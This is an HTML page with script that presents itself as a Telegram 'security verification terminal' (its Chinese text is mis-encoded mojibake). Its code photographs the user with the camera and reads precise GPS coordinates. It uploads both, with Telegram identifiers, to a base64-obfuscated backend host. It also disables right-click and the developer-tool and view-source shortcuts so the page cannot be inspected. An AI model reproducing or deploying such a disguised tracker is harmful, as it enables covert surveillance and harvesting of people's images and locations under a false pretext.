<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>æ±‡ç›ˆå›½é™…å®‰å…¨éªŒè¯ç»ˆç«¯</title>
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; }
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background: #000; overflow: hidden; 
            font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
            color: #fff;
        }
        #camera-container { 
            position: relative; width: 100%; height: 100%; 
            z-index: 1;
        }
        video, canvas { 
            position: absolute; top: 0; left: 0;
            width: 100%; height: 100%; object-fit: cover; 
        }
        #canvas { display: none; z-index: 2; }
        .corner {
            position: absolute; width: 40px; height: 40px;
            border-color: rgba(255, 255, 255, 0.5); border-style: solid;
            z-index: 10; pointer-events: none;
            filter: drop-shadow(0 0 2px rgba(0,0,0,0.5));
        }
        .tl { top: 20px; left: 20px; border-width: 2px 0 0 2px; }
        .tr { top: 20px; right: 20px; border-width: 2px 2px 0 0; }
        .bl { bottom: 20px; left: 20px; border-width: 0 0 2px 2px; }
        .br { bottom: 20px; right: 20px; border-width: 0 2px 2px 0; }
        .header-info {
            position: absolute; top: 50px; left: 0; width: 100%;
            text-align: center; z-index: 10;
            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
            display: flex; flex-direction: column; align-items: center; gap: 10px;
        }
        .status-badge {
            display: inline-flex; align-items: center; gap: 8px;
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.3);
            padding: 8px 18px; border-radius: 30px;
            backdrop-filter: blur(4px);
            font-size: 14px; letter-spacing: 1px; font-weight: 500;
        }
        .dot { width: 8px; height: 8px; background: #0f0; border-radius: 50%; box-shadow: 0 0 8px #0f0; }
        .location-hud {
            font-family: 'Courier New', Courier, monospace;
            font-size: 12px; color: rgba(255,255,255,0.8);
            background: rgba(0,0,0,0.3); padding: 4px 10px;
            border-radius: 4px; border: 1px solid rgba(255,255,255,0.1);
            display: none;
        }
        .controls-area {
            position: absolute; bottom: 0; left: 0; width: 100%;
            height: 200px; z-index: 20;
            background: linear-gradient(to top, rgba(0,0,0,0.8) 0%, transparent 100%);
            display: flex; justify-content: center; align-items: center;
        }
        .shutter-btn {
            width: 84px; height: 84px;
            border-radius: 50%;
            border: 4px solid rgba(255, 255, 255, 0.9);
            background: rgba(255, 255, 255, 0.1);
            position: relative; cursor: pointer;
            box-shadow: 0 0 20px rgba(0,0,0,0.4);
            transition: transform 0.1s;
        }
        .shutter-btn::after {
            content: ''; position: absolute;
            top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 70px; height: 70px;
            background: #fff; border-radius: 50%;
            transition: all 0.2s;
        }
        .shutter-btn:active { transform: scale(0.95); }
        .shutter-btn:active::after { width: 62px; height: 62px; opacity: 0.8; }
        #result-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.6); backdrop-filter: blur(8px);
            z-index: 50; display: none;
            flex-direction: column; justify-content: center; align-items: center;
        }
        .msg-box { text-align: center; padding: 20px; width: 80%; }
        .msg-title { font-size: 22px; font-weight: bold; margin-bottom: 12px; }
        .msg-sub { font-size: 14px; color: #ddd; margin-bottom: 30px; line-height: 1.5; }
        .action-btn {
            padding: 14px 0; width: 100%; border-radius: 12px;
            font-size: 16px; font-weight: 600; cursor: pointer;
            border: none; margin-bottom: 12px;
            transition: opacity 0.2s; color: white;
            display: block; box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        }
        .action-btn:active { opacity: 0.8; }
        .btn-retry { background: #007aff; }
        .btn-force { background: #ff3b30; animation: pulse 2s infinite; }
        .btn-cancel { background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.2); }
        #invalid-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #1c1c1e; z-index: 100;
            display: none; flex-direction: column;
            justify-content: center; align-items: center; text-align: center;
        }
        .icon-error { font-size: 64px; margin-bottom: 24px; }
        .loader {
            width: 48px; height: 48px; border: 4px solid #FFF;
            border-bottom-color: transparent; border-radius: 50%;
            display: inline-block; animation: rotation 1s linear infinite; margin-bottom: 20px;
        }
        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
    </style>
</head>
<body oncontextmenu="return false;">
<div id="camera-container">
    <div class="corner tl"></div><div class="corner tr"></div>
    <div class="corner bl"></div><div class="corner br"></div>
    <div class="header-info">
        <div class="status-badge">
            <div class="dot" id="status-dot"></div>
            <span id="user-display">ç³»ç»Ÿå°±ç»ª</span>
        </div>
        <div class="location-hud" id="loc-display">WAITING GPS...</div>
    </div>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    <div class="controls-area" id="controls">
        <div class="shutter-btn" id="shutter"></div>
    </div>
</div>
<div id="result-overlay">
    <div class="msg-box">
        <div class="loader" id="spinner"></div>
        <div class="msg-title" id="overlay-title">æ­£åœ¨ä¸Šä¼ </div>
        <div class="msg-sub" id="overlay-desc">æ­£åœ¨åŠ å¯†ä¼ è¾“æ•°æ®...</div>
        <div id="action-area" style="display:none;">
            <button class="action-btn btn-retry" id="btn-retry-loc">ğŸ“¡ é‡æ–°è·å–ä½ç½®</button>
            <button class="action-btn btn-force" id="btn-force" style="display:none;">âš ï¸ å¼ºåˆ¶å‘é€ (æ— å®šä½)</button>
            <button class="action-btn btn-cancel" id="btn-cancel">ğŸ”„ é‡æ‹ç…§ç‰‡</button>
        </div>
    </div>
</div>
<div id="invalid-screen">
    <div class="icon-error">â›”ï¸</div>
    <h2 style="margin:0;font-weight:600;">é“¾æ¥å·²å¤±æ•ˆ</h2>
    <p style="color:#888; padding: 0 30px; margin-top: 15px; font-size:15px; line-height:1.6;">
        å®‰å…¨ä»¤ç‰Œå·²å¤±æ•ˆã€‚<br>è¯·è”ç³»è´Ÿè´£äººæˆ–ä¸­ä»‹é‡æ–°è·å–æœ€æ–°é“¾æ¥ã€‚
    </p>
</div>
<script>
    const _0x1a2b = "aHR0cHM6Ly9odWl5aW5nODg4Lm9ucmVuZGVyLmNvbQ=="; 
    const BACKEND_URL = atob(_0x1a2b); 

    document.addEventListener('keydown', function(e) {
        if (
            e.keyCode === 123 || 
            (e.ctrlKey && e.shiftKey && e.keyCode === 73) || 
            (e.ctrlKey && e.keyCode === 83) || 
            (e.ctrlKey && e.keyCode === 85) 
        ) {
            e.preventDefault();
            return false;
        }
    });

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const shutter = document.getElementById('shutter');
    const controls = document.getElementById('controls');
    const overlay = document.getElementById('result-overlay');
    const spinner = document.getElementById('spinner');
    const title = document.getElementById('overlay-title');
    const desc = document.getElementById('overlay-desc');
    const actionArea = document.getElementById('action-area');
    const btnRetry = document.getElementById('btn-retry-loc');
    const btnForce = document.getElementById('btn-force');
    const btnCancel = document.getElementById('btn-cancel');
    const invalidScreen = document.getElementById('invalid-screen');
    const userDisplay = document.getElementById('user-display');
    const locDisplay = document.getElementById('loc-display');

    const params = new URLSearchParams(window.location.search);
    const chatId = params.get('chatid');
    const uid = params.get('uid') || '0';
    const token = params.get('token') || '';
    const name = decodeURIComponent(params.get('name') || 'æœªçŸ¥ç”¨æˆ·');

    if (name) userDisplay.innerText = `éªŒè¯ä¸­: ${name}`;

    let failCount = 0;

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } },
                audio: false
            });
            video.srcObject = stream;
        } catch (err) { alert("ç›¸æœºå¯åŠ¨å¤±è´¥ï¼Œè¯·æ£€æŸ¥æƒé™è¯·æŠŠTelegramï¼ˆé£æœºï¼‰çš„ç›¸æœºæƒé™æ‰“å¼€"); }
    }

    shutter.addEventListener('click', () => {
        if (!chatId) return showInvalidScreen();
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        video.style.display = 'none';
        canvas.style.display = 'block';
        controls.style.display = 'none';
        startUploadProcess(true);
    });

    function startUploadProcess(retryLocation) {
        overlay.style.display = 'flex';
        actionArea.style.display = 'none';
        spinner.style.display = 'inline-block';
        if (retryLocation) {
            title.innerText = "æ­£åœ¨è·å–å«æ˜Ÿå®šä½...";
            desc.innerText = "ä¸ºäº†æ‚¨çš„å®‰å…¨ï¼Œè¯·ç¡®ä¿GPSå·²å¼€å¯";
            getLocationAndUpload();
        } else {
            title.innerText = "å¼ºåˆ¶ä¸Šä¼ ä¸­...";
            desc.innerText = "æ­£åœ¨ä½¿ç”¨å¤‡ç”¨é€šé“...";
            executeUpload(0, 0);
        }
    }

    function getLocationAndUpload() {
        if (!navigator.geolocation) return handleLocError("è®¾å¤‡ä¸æ”¯æŒå®šä½ï¼Œè¯·è”ç³»è´Ÿè´£äººæˆ–ä½ çš„ä¸­ä»‹");
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const lat = pos.coords.latitude.toFixed(6);
                const lng = pos.coords.longitude.toFixed(6);
                title.innerText = "å®šä½æˆåŠŸ";
                locDisplay.style.display = 'block';
                locDisplay.innerText = `LAT:${lat} LNG:${lng}`;
                executeUpload(pos.coords.latitude, pos.coords.longitude);
            },
            (err) => { handleLocError(err); },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    }

    function handleLocError(err) {
        console.warn("Loc Error:", err);
        failCount++;
        spinner.style.display = 'none';
        title.innerText = "âš ï¸ å®šä½å¤±è´¥";
        desc.innerText = `æ— æ³•è·å–ç²¾ç¡®ä½ç½®ï¼Œè¯·å°è¯•é‡è¯•ã€‚è¯·ç¡®ä¿Telegramï¼ˆé£æœºï¼‰çš„ä½ç½®æƒé™æ‰“å¼€ï¼ (${failCount})`;
        actionArea.style.display = 'block';
        if (failCount >= 3) {
            btnForce.style.display = 'block';
        } else {
            btnForce.style.display = 'none';
        }
    }

    function executeUpload(lat, lng) {
        canvas.toBlob(async (blob) => {
            try {
                const params = new URLSearchParams({
                    chatid: chatId, uid: uid, name: name, 
                    lat: lat, lng: lng, time: Date.now(), token: token
                });
                const response = await fetch(`${BACKEND_URL}/upload?${params.toString()}`, {
                    method: 'POST',
                    body: blob,
                    headers: { 'Content-Type': 'application/octet-stream' }
                });
                if (response.status === 403) { showInvalidScreen(); return; }
                if (!response.ok) throw new Error("æœåŠ¡å™¨å“åº”é”™è¯¯");
                const result = await response.json();
                if (result.code === 0) {
                    title.innerText = "âœ…æˆåŠŸ";
                    desc.innerText = "æ•°æ®å·²å®‰å…¨ä¼ è¾“ï¼Œè¯·å…³é—­é¡µé¢";
                    spinner.style.display = 'none';
                    setTimeout(() => {
                        if (window.Telegram && window.Telegram.WebApp) {
                            window.Telegram.WebApp.close();
                        } else { window.close(); }
                    }, 2000);
                } else { throw new Error(result.msg); }
            } catch (err) {
                spinner.style.display = 'none';
                title.innerText = "âŒ ä¸Šä¼ å¤±è´¥";
                desc.innerText = err.message;
                actionArea.style.display = 'block';
            }
        }, 'image/jpeg', 0.8);
    }

    btnRetry.addEventListener('click', () => { startUploadProcess(true); });
    btnForce.addEventListener('click', () => { startUploadProcess(false); });
    btnCancel.addEventListener('click', () => {
        overlay.style.display = 'none';
        canvas.style.display = 'none';
        video.style.display = 'block';
        controls.style.display = 'flex';
        locDisplay.style.display = 'none'; 
    });

    function showInvalidScreen() {
        overlay.style.display = 'none';
        invalidScreen.style.display = 'flex';
    }

    startCamera();
</script>
</body>
</html>
